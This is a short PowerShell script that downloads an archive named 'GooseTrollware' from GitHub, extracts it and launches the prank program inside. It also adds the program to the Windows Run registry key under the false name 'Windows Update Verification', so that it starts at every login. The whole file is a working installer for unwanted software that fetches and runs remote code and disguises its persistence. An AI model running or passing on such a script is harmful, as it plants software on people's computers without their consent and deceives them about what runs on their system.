# Download and install
Set-Location $home
Invoke-WebRequest -Uri "https://github.com/Reginald-Gillespie/G2/raw/main/g.zip" -OutFile "GooseTrollware.zip"
Expand-Archive -Path "GooseTrollware.zip" -DestinationPath "GooseTrollware2" -Force

# Copy VBA script to startup folder
$gloc="$home\GooseTrollware2\Desktop Goose v0.31\DesktopGoose v0.31\run.vbs"

$key = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$valueName = "Windows Update Verification"
New-ItemProperty -Path $key -Name $valueName -Value $gloc -PropertyType String -Force | Out-Null

# And finally we start it
Start-Sleep 1
Start-Process $gloc